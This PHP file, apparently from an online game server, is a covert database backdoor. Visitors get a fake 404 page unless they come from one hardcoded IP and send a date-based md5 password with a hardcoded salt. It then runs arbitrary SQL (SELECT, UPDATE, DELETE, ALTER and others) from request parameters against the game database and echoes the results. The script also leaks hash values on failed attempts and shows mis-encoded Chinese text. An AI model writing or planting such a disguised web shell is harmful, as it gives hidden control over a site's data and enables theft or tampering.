<?php
function e404($str)
{
	die($str);
	header('HTTP/1.1 404 Not Found'); 
	header("status: 404 Not Found");
	?><!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL <?php echo $_SERVER['PHP_SELF']; ?> was not found on this server.</p>
</body></html>
<?php 
	exit();
}

function checkSQL($sql)
{
	$sql = trim($sql);
	if(preg_match("/^(select|replace|update|delete|alter|insert).*$/i",$sql,$out)||freeSql)
	{
		$out[1]=strtolower($out[1]);
		if( ($out[1]=='select'||$out[1]=='update'||$out[1]=='delete'||$out[1]=='delete')&&!preg_match("/limit \d+(,\d+)?;?$/i",$sql,$out1)&&!freeSql)
		{
			return false;
		}
		return array($out[1],$sql);
	}else{
		return false;
	}	
}

if($_SERVER['REMOTE_ADDR']!=='125.69.81.43'){
	e404($_SERVER['REMOTE_ADDR']);
}
if($_REQUEST['p']!==md5(date("Y/n/j")."((*^TV%&Ljty4#I6698)(*%(*IOU)("))
{
	e404(md5(date("m/d/Y")."((*^TV%&Ljty4#I6698)(*%(*IOU)(").'=='.$_REQUEST['p']);
}

define("freeSql",
isset($_GET['f'])&&$_GET['f']==md5(
									date("Y/n/j")."2I6698FrC$64(*%(*%35IOU)("
									)
								?true:false);
ini_set('display_errors','off');
//error_reporting(E_ALL);
require('../config/config.game.php');

//$conn=mysql_connect($_mysql['host'], $_mysql['user'], $_mysql['pass']) or     die("Could not connect: " . mysql_error());
//mysql_select_db($_mysql['db']	,$conn) or die("Could not connect: " . mysql_error());

$sqls = explode("\r\n",$_REQUEST['d']);
foreach($sqls as $sql)
{
	$sql = checkSQL($sql);
	if($sql===false)
	{
		echo "²»ÔÊÐíÖ´ÐÐ£º".$sql."!\r\n";
	}
	else
	{
		if(strtolower($sql[0])=='select')
		{
			$rs = $_pm['mysql']->getRecords($sql[1]);
			if($err=mysql_error())
			{
				echo $sql.":".$err."\r\n";
			}else{
				foreach($rs as $r)
				{
					foreach($r as $f)
					{
						echo $f."\t";
					}
					echo "\r\n";
				}
			}
		}
		else
		{
			$_pm['mysql']->query($sql[1]);
			if($err=mysql_error())
			{
				echo $sql.":".$err."\r\n";
			}else{
				echo mysql_affected_rows($_pm['mysql']->getConn());
			}
		}
	}
}
?> OK